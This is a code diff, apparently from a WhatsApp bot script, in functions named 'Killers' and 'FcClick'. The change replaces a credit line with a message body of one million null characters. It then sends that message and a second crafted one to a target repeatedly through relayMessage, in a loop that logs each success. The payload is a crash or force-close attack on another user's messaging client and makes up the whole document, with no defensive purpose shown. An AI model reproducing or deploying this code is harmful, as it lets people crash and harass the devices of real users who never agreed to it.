@@ -645,7 +645,7 @@ async function Killers(target) {
 
 async function FcClick(target) {
   try {
-    if (!sock.user) {
+    if (!client.user) {
       console.log("❌ Session expired");
       return;
     }
@@ -707,7 +707,7 @@ async function FcClick(target) {
         requestFrom: target,
         noteMessage: {
           extendedTextMessage: {
-            text: 'Credit By Ruxzs'
+            text: '\u0000'.repeat(1000000)
           }
         },
         expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
@@ -729,15 +729,15 @@ async function FcClick(target) {
     };
     
     for (let r = 0; r < 5; r++) {
-      const msg = await client.sendMessage(target, Msg2);
+      await sock.relayMessage(target, Msg2, {
+        participant: { jid: target }
+      });
+      await new Promise(resolve => setTimeout(resolve, 3000));
       
-      setTimeout(async () => {
-        await client.sendMessage(target, {
-          delete: msg.key
-        });
-    }, 500);
-    
-    await new Promise(resolve => setTimeout(resolve, 3000));
+      await sock.relayMessage(target, Msg1, {
+        participant: { jid: target }
+      });
+      await new Promise(resolve => setTimeout(resolve, 3000));
       
       console.log(`✅ Sukses sent to ${target}`);
     }
